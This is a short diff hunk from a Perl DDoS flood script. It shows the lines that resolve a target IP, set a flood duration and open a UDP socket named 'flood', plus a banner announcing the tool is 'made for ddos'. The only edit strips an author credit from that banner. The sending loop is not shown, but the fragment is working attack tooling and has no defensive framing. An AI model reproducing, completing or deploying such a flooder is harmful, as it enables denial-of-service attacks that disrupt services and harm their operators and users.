@@ -45,7 +45,7 @@ $iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-printf " Made by Vanguard for ddos \n";
+printf " Made for ddos \n";
 printf "
 ▓█████▄ ▓█████▄  ▒█████    ██████       ██▓███   ██▓    
 ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒      ▓██░  ██▒▓██▒    
